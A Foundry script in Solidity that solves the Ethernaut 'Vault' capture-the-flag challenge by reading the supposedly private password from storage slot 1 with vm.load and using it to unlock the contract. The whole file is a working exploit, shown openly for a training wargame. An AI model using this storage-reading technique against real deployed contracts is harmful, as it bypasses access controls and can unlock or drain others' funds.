// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

/// @author agadzhalov
/// @title Solution to Vault Ethernaut challenge
/// @notice Solution: 
///         One slot consists of 32 bytes. 
///         The `bool locked` is 1 byte, but `bytes32 password` is 32 bytes, which is why the password is stored at slot 1. 
///         p.s. Casting storage contract address slot can also be used for this exploit.
contract VaultScript is Script {
    /// @notice Instance of the Vault contract to interact with.
    Vault public vault = Vault(0xC41711FE786fd26315A923C24DEE84cE19AF5213);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Log the current lock status of the Vault contract
        console.log("1. Locked status:", vault.locked());

        // Load the password from slot 1 in the Vault contract's storage
        bytes32 passwordBytes = vm.load(address(vault), bytes32(uint256(1))); // gets the bytes at slot 1

        // Unlock the Vault using the loaded password
        vault.unlock(passwordBytes);

        // Log the new lock status of the Vault contract after unlocking
        console.log("2. Locked status:", vault.locked());

        vm.stopBroadcast();
    }
}
